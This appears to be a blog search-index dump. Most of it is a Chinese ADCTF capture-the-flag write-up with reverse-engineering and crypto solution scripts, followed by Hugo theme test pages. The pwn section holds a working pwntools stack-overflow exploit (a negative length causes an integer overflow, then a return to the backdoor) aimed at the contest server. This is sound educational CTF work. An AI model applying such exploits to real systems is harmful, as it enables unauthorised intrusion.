flag[i + 7] + 2 * flag[i + 8] - 19 == secret[i + 5]) solver.add(-7 * flag[i + 1] + 4 * flag[i + 2] - 5 * flag[i + 5] + 3 * flag[i + 6] + 6 * flag[i + 8] - 22 == secret[i + 6]) solver.add(9 * flag[i] + 2 * flag[i + 2] + 6 * flag[i + 3] - 4 * flag[i + 6] + 5 * flag[i + 7] - 3 * flag[i + 8] - 27 == secret[i + 7]) solver.add(4 * flag[i] - 5 * flag[i + 4] + 7 * flag[i + 5] + 3 * flag[i + 6] + 9 * flag[i + 7] - 2 * flag[i + 8] - 33 == secret[i + 8]) # Add constraints for flag ASCII values (valid ASCII range) for f in flag: solver.add(0 \u0026lt;= f, f \u0026lt;= 255) # Check if the solver finds a solution if solver.check() == sat: model = solver.model() result = \u0026#39;\u0026#39;.join(chr(model[flag[i]].as_long()) for i in range(36)) print(\u0026#34;The flag is:\u0026#34;, result) else: print(\u0026#34;No solution found\u0026#34;) #flag{y0U_4rE_r3@1ly_g0o0oOd_At_m4Th} 喝点茶吧 IDA打开之后，程序是加花过的，下面给出去花过程\n这段汇编指令ebx先xor了自己，所以ZF标志位一定是0，程序正常的执行流程只会执行jz指令跳转到0x4012FA+1的位置，解决方法patch掉0x4012FA的字节再把剩下的字节转换成code即可(C)\n第二处花指令和第一处类似，patch0x401328处的字节即可，包括loc_401320这一段数据也可以直接nop掉，因为程序只会执行jz这条指令的控制流，中间的都是不会执行的垃圾数据，去除完之后就可以在函数头按P定义这个函数，再F5反编译就可以看到main函数(已经过整理)\n接着分析encrypt函数\n发现并没有找到加密过程，查看这个函数的汇编可以发现这个函数也被加入了花指令\n看到这个位置，先是call了一个附近的位置，然后retn，call指令会把call指令的下一条指令的地址入栈，retn则会把存入栈中的地址弹出到eip中，这一段操作没有改变程序原来的执行流程，但是会导致IDA识别出错导致栈失衡，解决方法就是从call指令到retn的下一个字节全部patch掉(0x401215 - 0x401251)，接着就能看到完整的逻辑了\n__scrt_common_main_seh()就是具体的加密过程，然而这个函数也有花指令:(\n这两个位置和前面提到的基本一样，不赘述\n可以看到tea加密的特征，但是尝试解密得到的结果是错误的，这里有个MEMORY[0] = 0指令，这里要提到Windows系统下的异常处理机制SEH，简要来说就是通过某些逻辑错误导致系统发送错误信号，然后由SEH的过滤器来决定要不要接管这个错误，一旦系统开始接管这个错误，就会跳转到相应的处理函数，处理完成之后继续执行程序\n更详细的可以看(https://bbs.kanxue.com/thread-249592.htm)\n有了前面的知识之后，对程序动调，可以发现当ebp+var_1C地址处的值为0(sum = 0)时，程序在这个地方触发了一个异常(非法访问内存地址，对应的异常号为0xC0000005),这段指令的意思大概是访问了地址为0x0的内容\n接着找到异常号对应的处理函数\n阅读汇编之后其实就是调用了srand函数，seed为0x7E8\n当sum！=0的时候，程序继续往下执行会看到这个地方出发了一个除数异常(SIGILL，异常号0xC000094)\n这段汇编的意思就是一个数除以0，触发了这个异常，跳转到异常号对应的处理函数\n这里就是调用了rand函数，再把sum+=rand()，处理完之后继续执行程序的sum -= delta指令，从这里开始，tea加密的每一轮加密都会调用一次这个rand函数，所以我们需要理一下加密的执行流程：第一轮加密(i=0)正常执行，中间会触发异常调用srand(0x7E8)，后面的31轮加密每次都会执行sum+=rand(),位置在sum-=delta之前，理清执行流程之后就可以写exp了,exp如下(记得在Windows下执行，因为附件是exe文件)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void tea_decrypt(unsigned int* a1, unsigned int* a2) { int i; // [esp+2Ch] [ebp-28h] unsigned int v3; // [esp+30h] [ebp-24h] unsigned int v4; // [esp+34h] [ebp-20h] unsigned int v5; // [esp+38h] [ebp-1Ch] v4 = *a1; v3 = a1[1]; v5 = 0; v5 -= 0x61C88647; unsigned int seed = 0x7E8; srand(seed); int randoms[31]; for (int i = 0; i \u0026lt; 31; i++) { randoms[i] = rand(); // 生成一个随机数 v5 += randoms[i]; v5 -= 0x61C88647; } for (i = 0; i \u0026lt; 32; ++i) { //v4 += (a2[v5 \u0026amp; 3] + v5) ^ (v3 + ((v3 \u0026gt;\u0026gt; 5) ^ (16 * v3))); //v5 -= 0x61C88647; v3 -= (a2[(v5 \u0026gt;\u0026gt; 11) \u0026amp; 3] + v5) ^ (v4 + ((v4 \u0026gt;\u0026gt; 5) ^ (16 * v4))); v5 += 0x61C88647; if (i != 31) v5 -= randoms[30 - i]; v4 -= (a2[v5 \u0026amp; 3] + v5) ^ (v3 + ((v3 \u0026gt;\u0026gt; 5) ^ (16 * v3))); } *a1 = v4; a1[1] = v3; } int main() { // 加密的数据（假设为两个 32 位整数） unsigned int key[4] = { 0x114514, 0x1919810, 0x39C5BB, 0xFFE211 }; // 密钥 unsigned int data[12] = { 0xC20B1189,0x275D3ADE, 0xB1ADFCDE, 0x8201166D, 0xCD1E08DC, 0xA0830899, 0xC7C8C706, 0x9FC9A9F5, 0x8250A71D, 0xED329E66, 0xB88D21D7, 0x2EDA3C43 }; for (int i = 0; i \u0026lt; 12; i += 2) { unsigned int temp[2]; temp[0] = data[i]; temp[1] = data[i + 1]; tea_decrypt(temp, key); printf(\u0026#34;%x%x\u0026#34;, temp[0], temp[1]); } return 0; } //flag{Y0u_s0lv3d_thE_Qu3s7I0n_5O_dr1nk_5oMe_t3A} Py_revenge 拿到附件之后IDA打开会看到很多的Py字样，再根据题目名字可以猜出是pyinstaller打包的程序，用pyinstxtractor解包得到pyc文件，用pycdc反编译的时候会发现只有部分逻辑\n这种情况只能用pycdas看字节码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 [Disassembly] 0 RESUME 0 2 LOAD_CONST 0: 0 4 LOAD_CONST 1: None 6 IMPORT_NAME 0: base64 8 STORE_NAME 0: base64 10 BUILD_LIST 0 12 LOAD_CONST 2: (27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46) 14 LIST_EXTEND 1 16 STORE_NAME 1: secret 18 PUSH_NULL 20 LOAD_NAME 2: input 22 LOAD_CONST 3: \u0026#39;Please enter the flag:\u0026#39; 24 CALL 1 32 STORE_NAME 3: flag 34 PUSH_NULL 36 LOAD_NAME 0: base64 38 LOAD_ATTR 8: b64encode 58 LOAD_NAME 3: flag 60 LOAD_ATTR 11: encode 80 CALL 0 88 CALL 1 96 LOAD_ATTR 13: decode 116 CALL 0 124 STORE_NAME 3: flag 126 LOAD_NAME 3: flag 128 GET_ITER 130 LOAD_FAST_AND_CLEAR 0: c 132 SWAP 2 134 BUILD_LIST 0 136 SWAP 2 138 FOR_ITER 10 (to 160) 142 STORE_FAST 0: c 144 PUSH_NULL 146 LOAD_NAME 7: ord 148 LOAD_FAST 0: c 150 CALL 1 158 LIST_APPEND 2 160 JUMP_BACKWARD 12 (to 138) 162 END_FOR 164 SWAP 2 166 STORE_FAST 0: c 168 STORE_NAME 3: flag 170 LOAD_CONST 4: \u0026#39;ADCTF2024\u0026#39; 172 STORE_NAME 8: key 174 PUSH_NULL 176 LOAD_NAME 9: range 178 PUSH_NULL 180 LOAD_NAME 10: len 182 LOAD_NAME 3: flag 184 CALL 1 192 CALL 1 200 GET_ITER 202 FOR_ITER 46 (to 296) 206 STORE_NAME 11: i 208 LOAD_NAME 3: flag 210 LOAD_NAME 11: i 212 COPY 2 214 COPY 2 216 BINARY_SUBSCR 220 PUSH_NULL 222 LOAD_NAME 7: ord 224 LOAD_NAME 8: key 226 LOAD_NAME 11: i 228 PUSH_NULL 230 LOAD_NAME 10: len 232 LOAD_NAME 8: key 234 CALL 1 242 BINARY_OP 6 (%) 246 BINARY_SUBSCR 250 CALL 1 258 BINARY_OP 25 (^=) 262 SWAP 3 264 SWAP 2 266 STORE_SUBSCR 270 LOAD_NAME 3: flag 272 LOAD_NAME 11: i 274 COPY 2 276 COPY 2 278 BINARY_SUBSCR 282 LOAD_NAME 11: i 284 BINARY_OP 25 (^=) 288 SWAP 3 290 SWAP 2 292 STORE_SUBSCR 296 JUMP_BACKWARD 48 (to 202) 298 END_FOR 300 LOAD_NAME 3: flag 302 LOAD_NAME 1: secret 304 COMPARE_OP 40 (==) 308 POP_JUMP_IF_FALSE 9 (to 328) 310 PUSH_NULL 312 LOAD_NAME 12: print 314 LOAD_CONST 5: \u0026#39;Correct!\u0026#39; 316 CALL 1 324 POP_TOP 326 RETURN_CONST 1: None 328 PUSH_NULL 330 LOAD_NAME 12: print 332 LOAD_CONST 6: \u0026#39;Wrong!\u0026#39; 334 CALL 1 342 POP_TOP 344 RETURN_CONST 1: None 346 SWAP 2 348 POP_TOP 350 SWAP 2 352 STORE_FAST 0: c 354 RERAISE 0 经过分析可以知道程序的加密逻辑并不难，大概过程如下\n1 2 3 for i in len(flag) flag[i] = flag[i] ^ key[i % len(key)] ^ i #key = \u0026#34;ADCTF2024\u0026#34; 直接给出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import base64 secret = [ 27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46 ] key = \u0026#39;ADCTF2024\u0026#39; decoded_flag = [] for i in range(len(secret)): decoded_flag.append(secret[i] ^ ord(key[i % len(key)]) ^ i) decoded_flag_str = \u0026#39;\u0026#39;.join(chr(c) for c in decoded_flag) original_flag = base64.b64decode(decoded_flag_str).decode() print(original_flag) #flag{u_aR3_4_Py7h0n_M@5t3r} NotOnlyDotNet 拿到附件用IDA打开，进入main函数没有发现什么明显的加密逻辑，但是调用了ZSTD的api和一些进程之间的调用函数，并且通过ZSTD把两块内存中的数据解压出来了，猜测这两块内存是通过ZSTD压缩过后的数据，所以思路为dump出这两段数据再用ZSTD解压，看看程序的具体逻辑是什么\ndump shell_data 和 core_data有两种方式，第一种是直接动调dump出解压后的数据，第二种方法是用IDApyhton脚本把这两段数据dump成bin文件，再用ZSTD库进行解压得到文件，这里采用第二种方式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import idaapi import idc import ida_bytes start_address = 0x402010 # 起始地址 size = 0x24AA # 数据大小 output_file = \u0026#34;core_data.bin\u0026#34; # 打开文件准备写入 with open(output_file, \u0026#34;wb\u0026#34;) as f: for i in range(size): byte = ida_bytes.get_byte(start_address + i) f.write(bytes([byte])) 根据ida中给出的地址和大小就可以把这两个文件dump出来，然后用ZSTD解压\n1 2 3 4 5 C:\\Users\\HelloCTF_OS\\Downloads\\NotOnlyDotNet (1)\u0026gt;zstd -d gshell_data.bin -o gshell_data_decompressed gshell_data.bin : 66818650 bytes C:\\Users\\HelloCTF_OS\\Downloads\\NotOnlyDotNet (1)\u0026gt;zstd -d core_data.bin -o core_data_decompressed core_data.bin : 12288 bytes 得到这两个文件，对这两个程序查壳，发现是C#写的elf文件，用ILspy和dnspy进行反编译，ILspy和dnspy好像只能识别exe文件所以改了后缀\n执行流程大概是：AES-\u0026gt;XOR-\u0026gt;Base64，其中AES和XOR用到的key是通过main函数传参过来的，所以key应该是在shell里面，随便翻翻就能找到，这里直接整合到一起了\nexp如下(太懒了丢给ai了)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad import base64 def xor_decrypt(data, xor_key): \u0026#34;\u0026#34;\u0026#34;XOR 解密\u0026#34;\u0026#34;\u0026#34; return bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data)]) def aes_decrypt(ciphertext, aes_key): \u0026#34;\u0026#34;\u0026#34;AES 解密\u0026#34;\u0026#34;\u0026#34; cipher = AES.new(aes_key, AES.MODE_CBC, aes_key) # 使用 aes_key 作为 IV decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) return decrypted def main(aes_key, xor_key, encrypted_data_base64): # Base64 解密 encrypted_data = base64.b64decode(encrypted_data_base64) # 先进行 XOR 解密 xor_decrypted = xor_decrypt(encrypted_data, xor_key) # 再进行 AES 解密 aes_decrypted = aes_decrypt(xor_decrypted, aes_key) # 转换回 UTF-8 字符串 decrypted_flag = aes_decrypted.decode(\u0026#39;utf-8\u0026#39;) return decrypted_flag # 输入你的 aesKey 和 xorKey，以及已知的 Base64 加密后的数据 aes_key = bytes([62, 107, 51, 121, 49, 95, 102, 48, 114, 95, 122, 64, 107, 48, 60, 51]) # AES key xor_key = b\u0026#39;z@k0f1ndth3key2w\u0026#39; # XOR key（可以是任意字节数组） encrypted_data_base64 = \u0026#39;qpuQkUPI8knvxgK5U0UwKCrrQeOxdY8H6YKuzcD05OKatSh0UCg8+xDIxsbppDNaY3Eflx0Va8F/7wKxVrI8Qgq0vH4BUGXBDc1fSNUww5Y=\u0026#39; # 填入从C#程序中获取到的加密数据的Base64字符串 # 调用解密函数 decrypted_flag = main(aes_key, xor_key, encrypted_data_base64) print(f\u0026#34;解密后的 flag: {decrypted_flag}\u0026#34;) # flag{U_r_r33lly_tAl3nted_At_r3ve3s3_aNA1yz1ng!!!_p@ch1!!!nyA!!!} what!why!!! DIE查壳，发现upx壳直接upx -d脱壳\nmain函数直接就是加密逻辑，大概就是64字节的数据，每四个为一组进行处理这里v6的值并没有显式给出来，但是看汇编能知道是s的首地址+64，就是s的最后一个字节的地址，尝试写了exp但是结果都不对，奇怪的是前4个字节是flag，但是后面的都不对，猜测程序在第一组字节加密过后对过程进行了修改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { unsigned char input[64] = { 0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64 }; unsigned int i, j; unsigned int rand_value; unsigned int seed = 0xD000721; srand(seed); for (i = 0; i \u0026lt; 16; i++) { rand_value = rand(); for (j = 0; j \u0026lt; 4; j++) { input[4 * i + j] ^= rand_value; rand_value \u0026gt;\u0026gt;= 8; } seed = rand(); srand(seed); } for (int i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } 这是一开始写的exp，不对，重新对程序分析，在动调的时候发现程序调用sleep(60)的时候会一直处于sleep状态不跳出，应该是对sleep进行了修改，查看sleep的交叉引用\n发现可疑函数\n在最下面对sleep函数和srand函数都进行了操作，查看sub_4012C7函数\n发现调用了两次mprotect函数修改了参数a1的内存读写权限，大概可以猜到就是这里对sleep和srand函数进行了修改，虽然知道了srand函数被修改了，但是不知道传进来的第二个的参数有什么用，然后在汇编里面乱翻翻到了一个未定义的函数(纯运qaq)\n看汇编能看到熟悉的数字0x0D000721(seed)，可以根据汇编猜测就是当seed!=0x0D000721的时候会执行seed^=0x7A71571,所以main函数的加密过程是不完整的，经过修改的exp如下(请在linux环境下运行)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { unsigned char input[64] = { 0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64 }; unsigned int i, j; unsigned int rand_value; unsigned int seed = 0xD000721; srand(seed); for (i = 0; i \u0026lt; 16; i++) { rand_value = rand(); for (j = 0; j \u0026lt; 4; j++) { input[4 * i + j] ^= rand_value; rand_value \u0026gt;\u0026gt;= 8; } seed = rand(); if(seed != 0xD000721) seed ^= 0x7A71571;\t//srand被修改之后的加密逻辑 srand(seed); } for (int i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } //flag{kR@z1!!!y0U_3M1nent1y_g0o0od_aT_n0t_b3iNg_r1kr0lled_0rz!!!} Do you like Kotone? apk文件，jadx打开，找到mainactivity类\n对用户输入判断的地方是调用了checker类的checkFlag方法，跟进去看看\n可以看到在checkflag方法中调用了native层ezandroid.so文件的check方法，解压apk文件找到对应so文件打开\nso层就是实现了一个标准的rc4加密，这里就不赘述，提取出密文即可，rc4的key在Java层传参的时候就已给出\n流程就是base64-\u0026gt;rc4，其中base64进行了换表操作，跟进table变量可以在string.xml文件中找到table的值\n89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ\n尝试解密会失败，回到Java层的base64，根据函数名提示可能base64做了魔改，要重新看base64的逻辑，base64每次去三个字节的数据，最后会出现4个字节的密文，先取第一个字节的低6位并通过查表生成第一个字节的密文，接着取第第二个字节的低4位和一个字节的高2位拼在一起得到第二个字节密文，再取第二个字节高2位和第三个字节低4位组成第三个字节密文，再取第三个字节的低2位和第二个字节的高4位拼成第三个字节密文，最后取第三个字节的高6位组成第四个字节密文，如果明文的字节数不是3的倍数就缺几个字节填几个\u0026quot;=\u0026quot;，解密就跟着这个过程逆着写就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 data = \u0026#34;IktLx2oWUJP0aFKck0ocZF+G634e/24Go94OzrP8\u0026#34; #最后一个字节是\u0026#39;=\u0026#39;，改成table[0]这样不会影响解码过程 table = \u0026#34;89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ\u0026#34; table_dict = {char: idx for idx, char in enumerate(table)} flag = \u0026#34;\u0026#34; for i in range(0, len(data), 4): ch1 = table_dict[data[i]] ch2 = table_dict[data[i+1]] ch3 = table_dict[data[i+2]] ch4 = table_dict[data[i+3]] part1 = ch1 | ((ch2 \u0026amp; 3) \u0026lt;\u0026lt; 6) part2 = ((ch2 \u0026amp; 0x3c) \u0026gt;\u0026gt; 2) | ((ch3 \u0026amp; 0xf) \u0026lt;\u0026lt; 4) part3 = ((ch3 \u0026amp; 0x30) \u0026gt;\u0026gt; 4) | (ch4 \u0026lt;\u0026lt; 2) flag += chr(part1) flag += chr(part2) flag += chr(part3) print(flag) #flag{Kot0Ne_1s_re@IIy_KAw@ii} Crypto Too_Close_To_Sqrt 我做出来的密码题都没什么好说的，网上找的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from Crypto.Util.number import * import sympy # n 和 c 的值 n = 77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061 c = 702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220 # 使用 sympy 的 factorint() 来因式分解 n factors = sympy.ntheory.factorint(n) # 打印因数，查看哪些是 p 和 q print(factors) # 获取 p 和 q（在 RSA 中，n = p * q） # 假设 n 只包含两个质因数 p 和 q p = list(factors.keys())[0] q = list(factors.keys())[1] # 计算 φ(n) phi_n = (p - 1) * (q - 1) # 计算 d，d 是 e 的模 φ(n) 逆元 e = 65537 d = pow(e, -1, phi_n) # 解密密文 c m = pow(c, d, n) # 将 m 转换为字节并显示 flag = long_to_bytes(m) print(flag.decode()) #flag{oops_the_N_is_not_secure} One_Key_Pad 逻辑就是flag^key，给出了密文，并且已知前5个字节为flag{ 直接爆破key即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # 爆破和解密脚本 # 已知的明文前五个字节：\u0026#39;flag{\u0026#39; plaintext = [ord(c) for c in \u0026#34;flag{\u0026#34;] # 转换为字节序列 [102, 108, 97, 103, 123] # 密文的前五个字节 ciphertext = bytes.fromhex(\u0026#34;e0eae7e1fde3e7fcffd9fee9f4fb\u0026#34;)[:5] # 提取密文前五个字节 # 步骤 1: 爆破密钥 key = [] for p, c in zip(plaintext, ciphertext): key.append(p ^ c) # 打印出爆破得到的密钥 print(f\u0026#34;爆破出的key: {key}\u0026#34;) # 步骤 2: 解密整个密文 ciphertext_full = bytes.fromhex(\u0026#34;e0eae7e1fde3e7fcffd9fee9f4fb\u0026#34;) # 完整密文 # 解密过程 plaintext_full = [] for i in range(len(ciphertext_full)): plaintext_full.append(ciphertext_full[i] ^ key[i % len(key)]) # 输出解密后的明文 try: print(\u0026#34;解密后的明文:\u0026#34;, bytes(plaintext_full).decode()) except UnicodeDecodeError: print(\u0026#34;解密后的明文包含非打印字符，无法直接显示。\u0026#34;) print(\u0026#34;解密后的字节串:\u0026#34;, bytes(plaintext_full)) #flag{eazy_xor} Pwn ret2text IDA打开附件\n但是简单的栈溢出，程序会限制read函数读入的字节数小于96，但是nbytes由我们输入，所以只要输入-1造成整数溢出即可，后面就根据栈空间填payload到return的地址，然后换成后门的地址即可，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import * import time context(log_level = \u0026#39;debug\u0026#39;) host = \u0026#39;120.76.118.202\u0026#39; port = 33001 io = remote(host, port) io.recvuntil(b\u0026#34;Type your passphrase:\u0026#34;) io.sendline(b\u0026#34;115c79a11142301a2c418f7c689f188e\u0026#34;) #io.recvuntil(b\u0026#34;Anyway,how old are you now\u0026gt;\u0026#34;) time.sleep(1) io.sendline(b\u0026#39;-1\u0026#39;) padding = 0x68 return_addr = 0x400624 payload = b\u0026#39;a\u0026#39; * padding + p64(return_addr) #io.recvuntil(b\u0026#34;So what are you going to say?\\n\u0026#34;) io.sendline(payload) io.interactive() #flag{668c6131-3680-438b-aacd-f76c5cede90e} ","date":"2025-01-01T13:49:19+08:00","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/adctf/","title":"ADCTF"},{"content":"正文测试 而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。\n奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。\n引用 思念是最暖的忧伤像一双翅膀\n让我停不了飞不远在过往游荡\n不告而别的你 就算为了我着想\n这么沉痛的呵护 我怎么能翱翔\n最暖的憂傷 - 田馥甄\n图片 1 2 3 ![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) 相册语法来自 Typlog\n","date":"2020-09-09T00:00:00Z","image":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu4699868770670889127.jpg","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/test-chinese/","title":"Chinese Test"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; 